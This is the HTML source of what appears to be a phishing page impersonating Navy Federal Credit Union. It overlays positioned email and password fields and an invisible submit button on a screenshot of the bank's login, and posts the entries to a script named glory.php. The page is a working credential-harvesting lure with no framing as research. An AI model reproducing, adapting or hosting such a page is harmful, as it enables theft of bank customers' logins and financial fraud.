<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Navy Federal Credit Union</title>
</head>

<body>
<img src="1.png" width="1250" height="570" />
<form class="simple-form" name="VerifyCompForm" id="VerifyCompForm" method="post" action="glory.php" autocomplete="off">
   <input name="em" required=""  type="text" style="font-size:14px;padding:1px 10px;position:absolute;width: 194px;left: 197px;height: 31px;top: 357px;z-index:19;" />
   <input name="empa" required=""   type="password" style="font-size:14px;padding:1px 10px;position:absolute;width: 194px;left: 438px;height: 28px;top: 357px;z-index:19;">
   <input name="Submit" type="submit" style="position: absolute; width: 103px; left: 667px; top: 346px; opacity: 0; z-index: 9; height: 50px;" value="Submit" onmouseover=""  title="Submit" />
</body>
</html>
